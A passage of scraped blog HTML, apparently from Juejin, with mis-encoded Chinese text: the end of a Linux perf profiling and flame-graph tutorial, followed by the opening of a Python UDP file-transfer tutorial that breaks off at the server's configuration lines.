<p>âš ï¸ <strong>é‡è¦æç¤º</strong>ï¼šä¸èƒ½ç›´æ¥ <code>make</code>ï¼Œéœ€è¦å…ˆå®‰è£…æŸäº›ä¾èµ–ï¼Œå¦åˆ™ä¼šå¯¼è‡´æŸäº›å¼‚å¸¸ã€‚ç¼ºå°‘æŸäº›åº“è¯·å‚ç…§ç¼–è¯‘çš„æç¤ºè¿›è¡Œå®‰è£…ã€‚</p>
</blockquote>
<p><strong>å†…æ ¸èµ„æº</strong>ï¼š</p>
<ul>
<li>å†…æ ¸å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kernel.org%2F" target="_blank" title="https://www.kernel.org/" ref="nofollow noopener noreferrer">www.kernel.org/</a></li>
<li>å†…æ ¸ä¸‹è½½åœ°å€ï¼š<a href="https://link.juejin.cn?target=http%3A%2F%2Fftp.sjtu.edu.cn%2Fsites%2Fftp.kernel.org%2Fpub%2Flinux%2Fkernel%2F" target="_blank" title="http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/" ref="nofollow noopener noreferrer">ftp.sjtu.edu.cn/sites/ftp.kâ€¦</a></li>
</ul>
<p><strong>ç¼–è¯‘æ­¥éª¤</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. ä¸‹è½½æºç </span>
git <span class="hljs-built_in">clone</span> git://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git

<span class="hljs-comment"># 2. åˆ‡æ¢è‡³å¯¹åº”çš„ç‰ˆæœ¬åˆ†æ”¯</span>
<span class="hljs-built_in">cd</span> linux
git branch -r      <span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰è¿œç¨‹åˆ†æ”¯</span>
git branch -a      <span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯</span>
git checkout v5.4  <span class="hljs-comment"># åˆ‡æ¢åˆ° v5.4 åˆ†æ”¯</span>

<span class="hljs-comment"># 3. ç¼–è¯‘å®‰è£… perf</span>
<span class="hljs-built_in">cd</span> tools/perf
make

<span class="hljs-comment"># 4. æµ‹è¯• perf æ˜¯å¦æˆåŠŸå®‰è£…</span>
<span class="hljs-built_in">cd</span> ../..
sudo perf top
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[ä¸‹è½½æºç ] --&gt; B[åˆ‡æ¢ç‰ˆæœ¬åˆ†æ”¯]
    B --&gt; C[è¿›å…¥ tools/perf]
    C --&gt; D[æ‰§è¡Œ make]
    D --&gt; E[éªŒè¯å®‰è£…]
</code></pre>
<hr/>
<h3 data-id="heading-9">å››ã€Perf ä½¿ç”¨æ–¹æ³•</h3>
<h4 data-id="heading-10">4.1 perf list</h4>
<p>æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ”¯æŒçš„æ€§èƒ½äº‹ä»¶ã€‚ä½¿ç”¨ <code>perf list</code> å‘½ä»¤å¯ä»¥æ˜¾ç¤ºå½“å‰è½¯ç¡¬ä»¶ç¯å¢ƒä¸‹æ”¯æŒçš„æ‰€æœ‰äº‹ä»¶ï¼š</p>

























<table><thead><tr><th>äº‹ä»¶ç±»å‹</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><strong>Hardware Event</strong></td><td>ç”± PMU éƒ¨ä»¶äº§ç”Ÿï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹æ¢æµ‹æ€§èƒ½äº‹ä»¶</td><td>CPU å‘¨æœŸã€åˆ†æ”¯æŒ‡ä»¤ã€TLB é‡å¡«ä¾‹å¤–ã€Cache ç¼ºå¤±</td></tr><tr><td><strong>Software Event</strong></td><td>å†…æ ¸äº§ç”Ÿçš„äº‹ä»¶ï¼Œç»Ÿè®¡æ“ä½œç³»ç»Ÿç›¸å…³æ€§èƒ½äº‹ä»¶</td><td>ç³»ç»Ÿè°ƒç”¨æ¬¡æ•°ã€ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°ã€ä»»åŠ¡è¿ç§»æ¬¡æ•°ã€ç¼ºé¡µä¾‹å¤–æ¬¡æ•°</td></tr><tr><td><strong>Tracepoint Event</strong></td><td>å†…æ ¸ä¸­é™æ€ tracepoint è§¦å‘çš„äº‹ä»¶</td><td>slab åˆ†é…å™¨çš„åˆ†é…æ¬¡æ•°ç­‰</td></tr></tbody></table>
<h4 data-id="heading-11">4.2 perf top</h4>
<p>ç±»ä¼¼ <code>top</code> å‘½ä»¤ï¼Œä¸»è¦ç”¨äº<strong>å®æ—¶åˆ†æ</strong>å„ä¸ªå‡½æ•°åœ¨æŸä¸ªæ€§èƒ½äº‹ä»¶ä¸Šçš„çƒ­åº¦ï¼Œèƒ½å¤Ÿå¿«é€Ÿå®šä½çƒ­ç‚¹å‡½æ•°ï¼ŒåŒ…æ‹¬åº”ç”¨ç¨‹åºå‡½æ•°ã€æ¨¡å—å‡½æ•°ä¸å†…æ ¸å‡½æ•°ï¼Œç”šè‡³èƒ½å¤Ÿå®šä½åˆ°çƒ­ç‚¹æŒ‡ä»¤ã€‚</p>
<blockquote>
<p>ğŸ” <strong>æ‰§è¡Œéœ€è¦ root æƒé™</strong></p>
</blockquote>
<p><strong>å¸¸ç”¨å‚æ•°</strong>ï¼š</p>

















<table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>-e &lt;event&gt;</code></td><td>æŒ‡æ˜è¦åˆ†æçš„æ€§èƒ½äº‹ä»¶</td></tr><tr><td><code>-p &lt;pid&gt;</code></td><td>ä»…åˆ†æç›®æ ‡è¿›ç¨‹åŠå…¶åˆ›å»ºçš„çº¿ç¨‹</td></tr></tbody></table>
<h4 data-id="heading-12">4.3 perf stat</h4>
<p>ç”¨äºç»Ÿè®¡ event å‡ºç°çš„æ¬¡æ•°ï¼ˆè®¡æ•°æ¨¡å¼ï¼‰ã€‚</p>
<p><strong>é»˜è®¤äº‹ä»¶è¯´æ˜</strong>ï¼š</p>









































<table><thead><tr><th>äº‹ä»¶åç§°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>cpu-clock</code></td><td>ä»»åŠ¡çœŸæ­£å ç”¨çš„å¤„ç†å™¨æ—¶é—´ï¼ˆmsï¼‰ã€‚<code>CPUs utilized = cpu-clock / time elapsed</code>ï¼Œå€¼é«˜è¯´æ˜ç¨‹åºå¤šæ•°æ—¶é—´èŠ±è´¹åœ¨ CPU è®¡ç®—ä¸Šè€Œé IO</td></tr><tr><td><code>context-switches</code></td><td>ä¸Šä¸‹æ–‡çš„åˆ‡æ¢æ¬¡æ•°</td></tr><tr><td><code>CPU-migrations</code></td><td>å¤„ç†å™¨è¿ç§»æ¬¡æ•°ã€‚Linux ä¸ºç»´æŒå¤šå¤„ç†å™¨è´Ÿè½½å‡è¡¡ï¼Œä¼šå°†ä»»åŠ¡ä»ä¸€ä¸ª CPU è¿ç§»åˆ°å¦ä¸€ä¸ª CPU</td></tr><tr><td><code>page-faults</code></td><td>ç¼ºé¡µå¼‚å¸¸æ¬¡æ•°ã€‚é¡µé¢æœªå»ºç«‹ã€ä¸åœ¨å†…å­˜ã€æ˜ å°„å…³ç³»æœªå»ºç«‹ã€TLB ä¸å‘½ä¸­ã€æƒé™ä¸åŒ¹é…ç­‰éƒ½ä¼šè§¦å‘</td></tr><tr><td><code>cycles</code></td><td>æ¶ˆè€—çš„å¤„ç†å™¨å‘¨æœŸæ•°</td></tr><tr><td><code>instructions</code></td><td>æ‰§è¡Œçš„æŒ‡ä»¤æ•°ã€‚IPC ä¸ºå¹³å‡æ¯ä¸ª CPU cycle æ‰§è¡Œçš„æŒ‡ä»¤æ•°</td></tr><tr><td><code>branches</code></td><td>é‡åˆ°çš„åˆ†æ”¯æŒ‡ä»¤æ•°</td></tr><tr><td><code>branch-misses</code></td><td>é¢„æµ‹é”™è¯¯çš„åˆ†æ”¯æŒ‡ä»¤æ•°</td></tr></tbody></table>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">-e &lt;event&gt;  <span class="hljs-comment"># æŒ‡å®šæ€§èƒ½äº‹ä»¶ï¼ˆå¯ä»¥æ˜¯å¤šä¸ªï¼Œç”¨ , åˆ†éš”ï¼‰</span>
-p &lt;pid&gt;    <span class="hljs-comment"># æŒ‡å®šå¾…åˆ†æè¿›ç¨‹çš„ pidï¼ˆå¯ä»¥æ˜¯å¤šä¸ªï¼Œç”¨ , åˆ†éš”ï¼‰</span>
-t &lt;tid&gt;    <span class="hljs-comment"># æŒ‡å®šå¾…åˆ†æçº¿ç¨‹çš„ tidï¼ˆå¯ä»¥æ˜¯å¤šä¸ªï¼Œç”¨ , åˆ†éš”ï¼‰</span>
-a          <span class="hljs-comment"># ä»æ‰€æœ‰ CPU æ”¶é›†ç³»ç»Ÿæ•°æ®</span>
-d          <span class="hljs-comment"># æ‰“å°æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œå¯é‡å¤ 3 æ¬¡</span>
            <span class="hljs-comment">#   -dï¼šL1 å’Œ LLC data cache</span>
            <span class="hljs-comment">#   -d -dï¼šdTLB å’Œ iTLB events</span>
            <span class="hljs-comment">#   -d -d -dï¼šå¢åŠ  prefetch events</span>
</code></pre>
<h4 data-id="heading-13">4.4 perf record</h4>
<p>é‡‡æ ·æ¨¡å¼ï¼Œperf æ”¶é›†é‡‡æ ·ä¿¡æ¯å¹¶è®°å½•åœ¨æ–‡ä»¶ä¸­ï¼Œå¯ä»¥ç¦»çº¿åˆ†æã€‚ä½¿ç”¨ <code>perf report</code> è§£ææ”¶é›†çš„é‡‡æ ·æ•°æ®æ–‡ä»¶ã€‚</p>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>





















































<table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>-e</code></td><td>é€‰æ‹©æ€§èƒ½äº‹ä»¶</td></tr><tr><td><code>-p</code></td><td>å¾…åˆ†æè¿›ç¨‹çš„ id</td></tr><tr><td><code>-t</code></td><td>å¾…åˆ†æçº¿ç¨‹çš„ id</td></tr><tr><td><code>-a</code></td><td>åˆ†ææ•´ä¸ªç³»ç»Ÿçš„æ€§èƒ½</td></tr><tr><td><code>-C</code></td><td>åªé‡‡é›†æŒ‡å®š CPU æ•°æ®</td></tr><tr><td><code>-F</code></td><td>é‡‡æ ·é¢‘ç‡ï¼Œæ¯ç§’å¤šå°‘æ¬¡</td></tr><tr><td><code>-c</code></td><td>äº‹ä»¶çš„é‡‡æ ·å‘¨æœŸ</td></tr><tr><td><code>-o</code></td><td>æŒ‡å®šè¾“å‡ºæ–‡ä»¶ï¼Œé»˜è®¤ä¸º <code>perf.data</code></td></tr><tr><td><code>-A</code></td><td>ä»¥ append çš„æ–¹å¼å†™è¾“å‡ºæ–‡ä»¶</td></tr><tr><td><code>-f</code></td><td>ä»¥ OverWrite çš„æ–¹å¼å†™è¾“å‡ºæ–‡ä»¶</td></tr><tr><td><code>-g</code></td><td>è®°å½•å‡½æ•°é—´çš„è°ƒç”¨å…³ç³»</td></tr></tbody></table>
<p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sudo perf record -e cpu-clock -g -p 2548
<span class="hljs-comment"># -g         å‘Šè¯‰ perf record é¢å¤–è®°å½•å‡½æ•°çš„è°ƒç”¨å…³ç³»</span>
<span class="hljs-comment"># -e cpu-clock  ç›‘æ§çš„æŒ‡æ ‡ä¸º cpu å‘¨æœŸ </span>
<span class="hljs-comment"># -p         æŒ‡å®šéœ€è¦ record çš„è¿›ç¨‹ pid</span>
</code></pre>
<blockquote>
<p>ğŸ’¡ é‡‡æ ·ä¸€æ®µæ—¶é—´åï¼Œå¯ä»¥ä½¿ç”¨ <code>Ctrl+C</code> åœæ­¢å‘½ä»¤ï¼Œè¿™æ—¶ä¼šç”Ÿæˆ <code>perf.data</code> æ–‡ä»¶ï¼ˆé»˜è®¤æ–‡ä»¶åï¼‰</p>
</blockquote>
<h4 data-id="heading-14">4.5 perf report</h4>
<p>ä¸»è¦ç”¨æ¥åˆ†æ <code>perf record</code> ç”Ÿæˆçš„ <code>perf.data</code> æ–‡ä»¶ã€‚</p>
<hr/>
<h3 data-id="heading-15">äº”ã€ç”Ÿæˆç«ç„°å›¾</h3>
<h4 data-id="heading-16">5.1 æ“ä½œæµç¨‹</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A[perf record&lt;br/&gt;é‡‡é›†æ•°æ®] --&gt; B[perf script&lt;br/&gt;å¯¼å‡ºæ–‡æœ¬]
    B --&gt; C[stackcollapse-perf.pl&lt;br/&gt;æŠ˜å å †æ ˆ]
    C --&gt; D[flamegraph.pl&lt;br/&gt;ç”Ÿæˆ SVG]
    D --&gt; E[æµè§ˆå™¨æŸ¥çœ‹&lt;br/&gt;ç«ç„°å›¾]
</code></pre>
<h4 data-id="heading-17">5.2 ç¬¬ä¸€æ­¥ï¼šé‡‡æ ·å¹¶è®°å½•æ€§èƒ½æ•°æ®</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¯¹ CPU æ‰€æœ‰è¿›ç¨‹ 99Hz é‡‡é›†ï¼Œæ‰§è¡Œ 60 ç§’åé‡‡é›†å®Œæˆï¼Œå½“å‰ç›®å½•ç”Ÿæˆ perf.data æ–‡ä»¶</span>
perf record -F 99 -a -g -- <span class="hljs-built_in">sleep</span> 60
perf script &gt; out.perf

<span class="hljs-comment"># æˆ–è€…ï¼šå¯¹è¿›ç¨‹ id 181 é‡‡é›†ï¼Œé‡‡é›†æ—¶é—´ 60 ç§’ï¼Œæ‰§è¡ŒæœŸé—´ä¸è¦é€€å‡º</span>
perf record -F 99 -p 181 -g -- <span class="hljs-built_in">sleep</span> 60
perf script &gt; out.perf
</code></pre>
<h4 data-id="heading-18">5.3 ç¬¬äºŒæ­¥ï¼šç”¨ FlameGraph å·¥å…·è§£æ</h4>
<p><strong>å·¥å…·ä»“åº“</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbrendangregg%2FFlameGraph" target="_blank" title="https://github.com/brendangregg/FlameGraph" ref="nofollow noopener noreferrer">github.com/brendangregâ€¦</a></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å…‹éš†å·¥å…·ä»“åº“</span>
git <span class="hljs-built_in">clone</span> https://github.com/brendangregg/FlameGraph.git
<span class="hljs-built_in">cd</span> FlameGraph

<span class="hljs-comment"># æŠ˜å å †æ ˆä¿¡æ¯</span>
./stackcollapse-perf.pl out.perf &gt; out.folded

<span class="hljs-comment"># ç”Ÿæˆç«ç„°å›¾</span>
./flamegraph.pl out.folded &gt; kernel.svg
</code></pre>
<h4 data-id="heading-19">5.4 è§£è¯»ç«ç„°å›¾</h4>
<p>ç«ç„°å›¾æ˜¯åŸºäº stack ä¿¡æ¯ç”Ÿæˆçš„ SVG å›¾ç‰‡ï¼Œç”¨æ¥å±•ç¤º CPU çš„è°ƒç”¨æ ˆã€‚</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph ç«ç„°å›¾ç»“æ„
        direction TB
        Y[Y è½´ï¼šè°ƒç”¨æ ˆæ·±åº¦&lt;br/&gt;é¡¶éƒ¨æ˜¯æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°&lt;br/&gt;ä¸‹æ–¹æ˜¯çˆ¶å‡½æ•°]
        X[X è½´ï¼šæŠ½æ ·æ•°/æ‰§è¡Œæ—¶é—´&lt;br/&gt;å®½åº¦è¶Šå¤§æ‰§è¡Œæ—¶é—´è¶Šé•¿&lt;br/&gt;æŒ‰å­—æ¯é¡ºåºæ’åˆ—]
    end
</code></pre>
<p><strong>å…³é”®è¦ç‚¹</strong>ï¼š</p>





























<table><thead><tr><th>å…ƒç´ </th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>æ–¹æ¡†</strong></td><td>æ¯ä¸ªæ–¹æ¡†ä»£è¡¨ä¸€ä¸ªå‡½æ•°</td></tr><tr><td><strong>å®½åº¦</strong></td><td>æ–¹æ¡†è¶Šå®½ï¼Œä»£è¡¨æ‰§è¡Œæ—¶é—´è¶Šä¹…</td></tr><tr><td><strong>é«˜åº¦</strong></td><td>æ¥¼å±‚è¶Šé«˜ï¼Œä»£è¡¨è°ƒç”¨æ ˆè¶Šæ·±</td></tr><tr><td><strong>é¡¶å±‚</strong></td><td>æœ€é¡¶å±‚çš„å‡½æ•°æ˜¯å¶å­å‡½æ•°ï¼ˆæ­£åœ¨æ‰§è¡Œçš„å‡½æ•°ï¼‰</td></tr><tr><td><strong>å¹³é¡¶</strong></td><td>å¦‚æœæœ‰"å¹³é¡¶"ï¼ˆplateausï¼‰ï¼Œè¡¨ç¤ºè¯¥å‡½æ•°å¯èƒ½å­˜åœ¨æ€§èƒ½é—®é¢˜</td></tr></tbody></table>
<blockquote>
<p>ğŸ¯ <strong>åˆ†ææŠ€å·§</strong>ï¼šç«ç„°å›¾å°±æ˜¯çœ‹é¡¶å±‚çš„å“ªä¸ªå‡½æ•°å æ®çš„å®½åº¦æœ€å¤§ã€‚åªè¦æœ‰"å¹³é¡¶"ï¼Œå°±è¡¨ç¤ºè¯¥å‡½æ•°å¯èƒ½å­˜åœ¨æ€§èƒ½é—®é¢˜ï¼Œæ˜¯ä¼˜åŒ–çš„é‡ç‚¹ç›®æ ‡ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-20">é™„å½•ï¼šå¿«é€Ÿå‚è€ƒå¡ç‰‡</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®æ—¶æŸ¥çœ‹çƒ­ç‚¹å‡½æ•°</span>
sudo perf top -p &lt;pid&gt;

<span class="hljs-comment"># ç»Ÿè®¡æ€§èƒ½äº‹ä»¶</span>
sudo perf <span class="hljs-built_in">stat</span> -p &lt;pid&gt; -d

<span class="hljs-comment"># é‡‡æ ·å¹¶ç”Ÿæˆç«ç„°å›¾ï¼ˆå®Œæ•´æµç¨‹ï¼‰</span>
sudo perf record -F 99 -p &lt;pid&gt; -g -- <span class="hljs-built_in">sleep</span> 60
perf script &gt; out.perf
./stackcollapse-perf.pl out.perf &gt; out.folded
./flamegraph.pl out.folded &gt; flame.svg
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Pythonå®ç°åŸºäºUDPçš„æ–‡ä»¶ä¼ è¾“ï¼šå®Œæ•´æ•™ç¨‹ï¼ˆé™„é¿å‘æŒ‡å—ï¼‰]]></title>    <link>https://juejin.cn/post/7581693431740006463</link>    <guid>https://juejin.cn/post/7581693431740006463</guid>    <pubDate>2025-12-09T14:19:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581693431740006463" data-draft-id="7581669438577426468" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Pythonå®ç°åŸºäºUDPçš„æ–‡ä»¶ä¼ è¾“ï¼šå®Œæ•´æ•™ç¨‹ï¼ˆé™„é¿å‘æŒ‡å—ï¼‰"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2025-12-09T14:19:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åˆšå“¥çš„è¿›åŒ–è·¯"/> <meta itemprop="url" content="https://juejin.cn/user/71892859621675"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Pythonå®ç°åŸºäºUDPçš„æ–‡ä»¶ä¼ è¾“ï¼šå®Œæ•´æ•™ç¨‹ï¼ˆé™„é¿å‘æŒ‡å—ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/71892859621675/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åˆšå“¥çš„è¿›åŒ–è·¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T14:19:01.000Z" title="Tue Dec 09 2025 14:19:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>UDPæœ¬èº«æ˜¯æ— è¿æ¥ã€ä¸å¯é çš„ä¼ è¾“åè®®ï¼Œç›´æ¥ç”¨æ¥ä¼ æ–‡ä»¶å®¹æ˜“å‡ºç°ä¸¢åŒ…ã€ä¹±åºé—®é¢˜ï¼Œä½†é€šè¿‡â€œåˆ†å—ä¼ è¾“+æ ¡éªŒ+é‡ä¼ â€çš„è®¾è®¡ï¼Œä¾ç„¶èƒ½å®ç°ç¨³å®šçš„æ–‡ä»¶ä¼ è¾“ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€UDPæ–‡ä»¶ä¼ è¾“çš„æ ¸å¿ƒè®¾è®¡æ€è·¯</h2>
<p>UDPä¸ä¿è¯æ•°æ®é€è¾¾ï¼Œæ‰€ä»¥è¦å…ˆè§£å†³ä¸‰ä¸ªå…³é”®é—®é¢˜ï¼š</p>
<ol>
<li><strong>åˆ†å—ä¼ è¾“</strong>ï¼šå°†å¤§æ–‡ä»¶æ‹†åˆ†æˆå›ºå®šå¤§å°çš„æ•°æ®åŒ…ï¼ˆå¦‚1024å­—èŠ‚ï¼‰ï¼Œé¿å…å•æ¬¡å‘é€æ•°æ®è¿‡å¤§å¯¼è‡´ä¸¢åŒ…ï¼›</li>
<li><strong>åŒ…æ ‡è¯†</strong>ï¼šæ¯ä¸ªæ•°æ®åŒ…æ·»åŠ â€œåºå·+æ€»åŒ…æ•°+æ ¡éªŒä½â€ï¼ŒæœåŠ¡ç«¯æ¥æ”¶åèƒ½æ ¡éªŒå®Œæ•´æ€§ã€æ’åºé‡ç»„ï¼›</li>
<li><strong>ç¡®è®¤é‡ä¼ </strong>ï¼šæœåŠ¡ç«¯æ¥æ”¶æ¯ä¸ªæ•°æ®åŒ…åè¿”å›ç¡®è®¤ï¼ˆACKï¼‰ï¼Œå®¢æˆ·ç«¯æœªæ”¶åˆ°ACKåˆ™é‡ä¼ è¯¥æ•°æ®åŒ…ï¼Œä¿è¯å¯é æ€§ã€‚</li>
</ol>
<p>æ ¸å¿ƒæµç¨‹ï¼š</p>
<ul>
<li><strong>å®¢æˆ·ç«¯</strong>ï¼šè¯»å–æ–‡ä»¶â†’åˆ†å—â†’åŠ æ ‡è¯†â†’å‘é€æ•°æ®åŒ…â†’ç­‰å¾…ACKâ†’é‡ä¼ å¤±è´¥åŒ…â†’å‘é€ç»“æŸæ ‡è¯†ï¼›</li>
<li><strong>æœåŠ¡ç«¯</strong>ï¼šæ¥æ”¶æ•°æ®åŒ…â†’æ ¡éªŒâ†’æ’åºâ†’é‡ç»„â†’ä¿å­˜æ–‡ä»¶â†’è¿”å›ACKã€‚</li>
</ul>
<h2 data-id="heading-1">äºŒã€å®Œæ•´å®ç°ä»£ç </h2>
<h3 data-id="heading-2">1. æœåŠ¡ç«¯ä»£ç ï¼ˆæ¥æ”¶æ–‡ä»¶ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> os

<span class="hljs-comment"># é…ç½®å‚æ•°</span>
UDP_IP = <span class="hljs-string">""</span>  <span class="hljs-comment"># ç›‘å¬æ‰€æœ‰æœ¬æœºIP</span>
UDP_PORT = <span class="hljs-number">9999</span>
BUFFER_SIZE = <span class="hljs-number">1024</span>  <span class="hljs-comment"># æ•°æ®åŒ…å¤§å°ï¼ˆéœ€å’Œå®¢æˆ·ç«¯ä¸€è‡´ï¼‰</span>
